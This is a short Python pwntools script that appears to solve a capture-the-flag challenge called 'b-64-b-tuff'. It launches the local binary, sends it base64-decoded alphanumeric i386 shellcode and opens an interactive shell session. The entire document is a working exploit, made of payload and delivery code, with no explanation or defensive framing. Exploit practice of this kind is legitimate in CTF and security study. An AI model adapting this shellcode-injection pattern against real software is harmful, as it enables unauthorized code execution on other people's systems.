#!/usr/bin/env python
from pwn import *
import base64
context.arch = 'i386'
p = process('./b-64-b-tuff')	
shellcode = base64.b64decode("PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA")
print p.recv()
p.send(shellcode)
print p.recv()
p.interactive()
